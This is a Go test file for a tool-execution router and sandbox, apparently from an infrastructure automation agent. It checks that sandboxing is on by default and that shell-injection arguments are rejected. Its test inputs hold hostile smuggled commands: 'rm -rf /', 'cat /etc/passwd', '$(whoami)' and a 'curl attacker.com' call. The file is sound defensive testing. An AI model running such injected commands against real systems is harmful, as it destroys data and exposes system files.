package tools

import (
	"context"
	"testing"
)

// SEC-03: Sandbox Default — NewSandbox() must return Enforce=true.

func TestSEC03_NewSandboxEnforceDefault(t *testing.T) {
	s := NewSandbox()
	if !s.Enforce {
		t.Fatalf("SEC-03: NewSandbox() must default Enforce=true")
	}
}

func TestSEC03_EnforceTrueBlocksUnsandboxedExecution(t *testing.T) {
	s := NewSandbox() // Enforce=true, Enabled=false
	_, err := s.Run(context.Background(), []string{"echo", "hello"})
	if err == nil {
		t.Fatalf("SEC-03: enforce=true + enabled=false must block execution")
	}
	if err.Error() != "sandbox required" {
		t.Fatalf("SEC-03: expected 'sandbox required', got: %v", err)
	}
}

func TestSEC03_EnforceFalsePermitsExecution(t *testing.T) {
	s := &Sandbox{Enforce: false, RunFunc: func(ctx context.Context, cmd []string) ([]byte, error) {
		return []byte("ok"), nil
	}}
	out, err := s.Run(context.Background(), []string{"echo", "hello"})
	if err != nil {
		t.Fatalf("SEC-03: enforce=false should permit execution, got: %v", err)
	}
	if string(out) != "ok" {
		t.Fatalf("SEC-03: unexpected output: %s", string(out))
	}
}

func TestSEC03_NilSandboxRejectedByRouter(t *testing.T) {
	router := NewRouter()
	_, err := router.Execute(context.Background(), ExecuteRequest{
		Tool:   "kubectl",
		Action: "get",
		Input:  map[string]any{"resource": "pods"},
	}, nil, HTTPClients{})
	if err == nil {
		t.Fatalf("SEC-03: nil sandbox must be rejected by router")
	}
	if err.Error() != "sandbox required" {
		t.Fatalf("SEC-03: expected 'sandbox required', got: %v", err)
	}
}

func TestSEC03_NewSandboxPermissiveWarns(t *testing.T) {
	// NewSandboxPermissive should return Enforce=false.
	s := NewSandboxPermissive()
	if s.Enforce {
		t.Fatalf("SEC-03: NewSandboxPermissive() must set Enforce=false")
	}
}

// SEC-04: Argument Injection — shell metacharacters must be rejected.

func TestSEC04_SemicolonInjection(t *testing.T) {
	cmd := []string{"kubectl", "get", "pods; rm -rf /"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: semicolon injection not blocked: %v", err)
	}
}

func TestSEC04_DollarSubstitution(t *testing.T) {
	cmd := []string{"kubectl", "exec", "$(whoami)"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: $() substitution not blocked: %v", err)
	}
}

func TestSEC04_BacktickSubstitution(t *testing.T) {
	cmd := []string{"helm", "get", "`id`"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: backtick substitution not blocked: %v", err)
	}
}

func TestSEC04_PipeInjection(t *testing.T) {
	cmd := []string{"kubectl", "get", "pods | cat /etc/passwd"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: pipe injection not blocked: %v", err)
	}
}

func TestSEC04_AmpersandInjection(t *testing.T) {
	cmd := []string{"kubectl", "get", "pods && curl attacker.com"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: ampersand injection not blocked: %v", err)
	}
}

func TestSEC04_NewlineInjection(t *testing.T) {
	cmd := []string{"kubectl", "get", "pods\nrm -rf /"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: newline injection not blocked: %v", err)
	}
}

func TestSEC04_CarriageReturnInjection(t *testing.T) {
	cmd := []string{"kubectl", "get", "pods\rrm -rf /"}
	if err := ValidateToolArgs(cmd); err != errDangerousArg {
		t.Fatalf("SEC-04: carriage return injection not blocked: %v", err)
	}
}

func TestSEC04_CleanArgsAllowed(t *testing.T) {
	cases := [][]string{
		{"kubectl", "scale", "deploy/my-app", "--replicas=3"},
		{"helm", "upgrade", "--install", "release", "chart", "-f", "/path/to/values.yaml"},
		{"aws", "sts", "assume-role", "--role-arn", "arn:aws:iam::123456789012:role/MyRole"},
		{"kubectl", "get", "pods", "-n", "kube-system", "--selector", "app=nginx"},
	}
	for _, cmd := range cases {
		if err := ValidateToolArgs(cmd); err != nil {
			t.Fatalf("SEC-04: legitimate args should pass, cmd=%v err=%v", cmd, err)
		}
	}
}

func TestSEC04_UnregisteredToolRejected(t *testing.T) {
	_, err := ValidateToolName("evilcmd")
	if err == nil {
		t.Fatalf("SEC-04: unregistered tool must be rejected")
	}
}

func TestSEC04_EmptyToolNameRejected(t *testing.T) {
	_, err := ValidateToolName("")
	if err == nil {
		t.Fatalf("SEC-04: empty tool name must be rejected")
	}
}

func TestSEC04_RegisteredToolAccepted(t *testing.T) {
	registeredTools := []string{"kubectl", "helm", "aws", "vault", "argocd", "git", "github", "gitlab"}
	for _, name := range registeredTools {
		tool, err := ValidateToolName(name)
		if err != nil {
			t.Fatalf("SEC-04: registered tool %q should be accepted: %v", name, err)
		}
		if tool.Name != name {
			t.Fatalf("SEC-04: expected tool name %q, got %q", name, tool.Name)
		}
	}
}

func TestSEC04_RouterValidatesArgsBeforeExecution(t *testing.T) {
	router := NewRouter()
	sandbox := &Sandbox{
		Enforce: false,
		RunFunc: func(ctx context.Context, cmd []string) ([]byte, error) {
			t.Fatalf("SEC-04: sandbox.Run should NOT be called for dangerous args")
			return nil, nil
		},
	}
	// kubectl get with shell injection in resource name.
	_, err := router.Execute(context.Background(), ExecuteRequest{
		Tool:   "kubectl",
		Action: "get",
		Input:  map[string]any{"resource": "pods; rm -rf /"},
	}, sandbox, HTTPClients{})
	if err == nil {
		t.Fatalf("SEC-04: shell metacharacters in tool input must be rejected")
	}
}
